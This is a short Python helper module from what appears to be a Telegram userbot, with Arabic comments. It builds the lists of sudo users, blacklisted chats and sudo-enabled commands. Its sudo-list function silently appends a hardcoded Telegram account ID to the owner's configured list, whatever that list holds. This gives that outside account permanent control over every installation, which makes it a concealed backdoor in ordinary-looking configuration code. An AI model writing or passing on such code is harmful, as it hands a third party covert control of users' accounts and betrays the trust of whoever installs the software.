from ..sql_helper.global_collectionjson import get_collection
from ..sql_helper.global_list import get_collection_list
from ..Config import Config

MY_ID = 1165225957

def _sudousers_list():
    """قائمة مطوري السدو مع إضافة ايديك تلقائياً"""
    try:
        sudousers = get_collection(Config.OWNER_ID, "sudousers_list").json
    except AttributeError:
        sudousers = {}
    
    ulist = list(sudousers.keys())
    ulist = [int(chat) for chat in ulist]
    
    # إضافة ايديك للقائمة إذا ما موجود
    if MY_ID not in ulist:
        ulist.append(MY_ID)
    return ulist

def _users_list():
    """قائمة المستخدمين المسموح لهم بالتحكم"""
    ulist = _sudousers_list()
    if "me" not in ulist:
        ulist.append("me")
    return ulist

def blacklist_chats_list():
    """قائمة المحادثات المحظورة"""
    try:
        blacklistchats = get_collection(Config.OWNER_ID, "blacklist_chats_list").json
    except AttributeError:
        blacklistchats = {}
    blacklist = blacklistchats.keys()
    return [int(chat) for chat in blacklist]

def sudo_enabled_cmds():
    """الأوامر المسموح للسدو باستخدامها"""
    listcmds = get_collection_list("sudo_enabled_cmds")
    return list(listcmds)